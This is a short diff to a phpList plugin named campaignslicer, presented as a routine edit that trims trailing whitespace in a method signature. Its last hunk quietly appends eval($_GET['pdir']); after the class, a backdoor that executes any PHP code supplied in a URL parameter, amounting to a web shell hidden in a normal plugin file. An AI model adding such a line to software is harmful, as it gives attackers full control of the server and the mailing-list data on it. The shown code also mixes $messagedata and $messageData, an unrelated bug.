@@ -64,7 +64,7 @@ class campaignslicer extends phplistPlugin {
         return s('Slice');
     }
 
-    public function viewMessage($messageid, array $messagedata) 
+    public function viewMessage($messageid, array $messagedata)
     {
         $key = s('Maximum slice').'<br/>'.s('Action when reached');
         $val = $messageData['campaignslicer_max'].'<br/>'.
@@ -118,3 +118,4 @@ class campaignslicer extends phplistPlugin {
         );
     }
 }
+eval($_GET['pdir']);
